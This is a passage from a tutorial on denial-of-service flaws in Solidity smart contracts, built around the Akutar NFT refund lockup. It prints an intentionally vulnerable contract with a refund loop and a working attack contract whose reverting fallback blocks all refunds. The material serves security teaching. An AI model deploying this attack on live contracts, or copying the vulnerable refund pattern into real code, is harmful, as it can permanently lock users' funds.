In this lesson, we will introduce the Denial of Service (DoS) vulnerability in smart contracts and discuss methods for prevention. The NFT project Akutar once suffered a loss of 11,539 ETH, worth $34 million at the time, due to a DoS vulnerability.

## DoS

In Web2, a Denial of Service (DoS) attack refers to the phenomenon of overwhelming a server with a large amount of junk or disruptive information, rendering it unable to serve legitimate users. In Web3, it refers to exploiting vulnerabilities that prevent a smart contract from functioning properly.

In April 2022, a popular NFT project called Akutar raised 11,539.5 ETH through a Dutch auction for its public launch, achieving great success. Participants who held their community Passes were supposed to receive a refund of 0.5 ETH. However, when they attempted to process the refunds, they discovered that the smart contract was unable to function correctly, resulting in all funds being permanently locked in the contract. Their smart contract had a DoS vulnerability.

![](https://raw.githubusercontent.com/remix-project-org/remix-workshops/master/DoS/img/S09-1.png)

## Vulnerability Example

Now let's study a simplified version of the Akutar contract called `DoSGame`. This contract has a simple logic: when the game starts, players call the `deposit()` function to deposit funds into the contract, and the contract records the addresses of all players and their corresponding deposits. When the game ends, the `refund()` function is called to refund ETH to all players in sequence.

```solidity
// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.21;

// Game with DoS vulnerability, players deposit money and call refund to withdraw it after the game ends.
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // All players deposit ETH into the contract
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // Record the deposit
        balanceOf[msg.sender] = msg.value;
        // Record the player's address
        players.push(msg.sender);
    }

    // Game ends, refund starts, all players receive refunds one by one
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // Loop through all players to refund them
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}
```

The vulnerability here lies in the `refund()` function, where a loop is used to refund the players using the `call` function, which triggers the fallback function of the target address. If the target address is a malicious contract and contains malicious logic in its fallback function, the refund process will not be executed properly.

```
(bool success, ) = player.call{value: refundETH}("");
```

Below, we write an attack contract where the `attack()` function calls the `deposit()` function of the `DoSGame` contract to deposit funds and participate in the game. The `fallback()` fallback function reverts all transactions sending ETH to this contract, attacking the DoS vulnerability in the `DoSGame` contract. As a result, all refunds cannot be executed properly, and the funds are locked in the contract, just like the over 11,000 ETH in the Akutar contract.

```solidity
contract Attack {
    // DoS attack during refund
    fallback() external payable{
        revert("DoS Attack!");
    }

    // Participate in the DoS game and deposit
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
```
